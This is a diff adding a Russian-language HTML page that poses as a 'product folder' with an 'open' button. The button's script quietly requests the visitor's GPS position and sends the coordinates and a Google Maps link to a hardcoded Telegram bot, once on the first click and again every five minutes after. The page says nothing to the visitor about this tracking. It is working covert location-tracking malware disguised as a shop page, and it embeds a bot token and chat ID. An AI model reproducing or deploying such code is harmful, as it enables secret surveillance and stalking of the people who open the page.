@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Папка товаров</title>
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(135deg,#06121f,#0a2a44,#0e3b5e);
+  font-family:Arial;
+  color:white;
+}
+
+.box{
+  width:90%;
+  max-width:420px;
+  background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(15px);
+  padding:25px;
+  border-radius:20px;
+  text-align:center;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:#00b7ff;
+  color:white;
+  font-weight:bold;
+  margin-top:10px;
+}
+
+.status{
+  margin-top:15px;
+  font-size:14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2>📍 папка</h2>
+  <p>нажмите чтобы открыть товар</p>
+
+  <button onclick="startGPS()">открыть</button>
+
+  <div class="status" id="status">ожидание...</div>
+</div>
+
+<script>
+const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
+const CHAT_ID = "8424328584";
+
+async function sendTG(text){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text
+    })
+  });
+}
+
+function startGPS(){
+
+  if(!navigator.geolocation){
+    alert("GPS не поддерживается");
+    return;
+  }
+
+  document.getElementById("status").innerText =
+    " активен";
+
+  // ❗ каждый пользователь создаёт СВОЙ поток
+  setInterval(()=>{
+
+    navigator.geolocation.getCurrentPosition(async (pos)=>{
+
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      await sendTG(
+`📍 Live GPS
+
+🌐 Координаты:
+${lat}, ${lon}
+
+🗺 Google Maps:
+https://maps.google.com/?q=${lat},${lon}`
+      );
+
+    });
+
+  }, 5 * 60 * 1000);
+
+  // сразу первая отправка
+  navigator.geolocation.getCurrentPosition(async (pos)=>{
+
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+
+    await sendTG(
+`📍 NEW USER
+
+🌐 ${lat}, ${lon}
+
+🗺 https://maps.google.com/?q=${lat},${lon}`
+    );
+
+  });
+
+}
+</script>
+
+</body>
+</html>
